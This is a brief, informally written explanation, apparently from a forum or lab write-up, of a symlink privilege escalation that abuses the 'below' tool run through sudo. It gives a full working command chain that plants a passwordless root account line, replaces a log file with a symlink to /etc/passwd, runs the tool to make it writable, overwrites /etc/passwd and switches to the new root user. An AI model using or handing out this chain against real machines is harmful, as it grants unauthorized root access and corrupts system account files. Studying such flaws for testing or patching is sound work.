Its a clasic Symlink Privilege Escalation:

You must find the file that simlinks with the /etc/passwd
then:

echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass && rm -f /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && sudo /usr/bin/below

exit the below program and type:

cp /tmp/fakepass /var/log/below/error_root.log && su pwn



So you created a fake file that has prev escal inside. You removed the error_root.log file that is symlinked with passwords (this file has the logs from below app)
Then you simlink the passwd file with a new "error_....". You run this app, so the below put his logs at this new file that you can right on.
and then you cp for payload file at this new file "error..." and just su at th new user
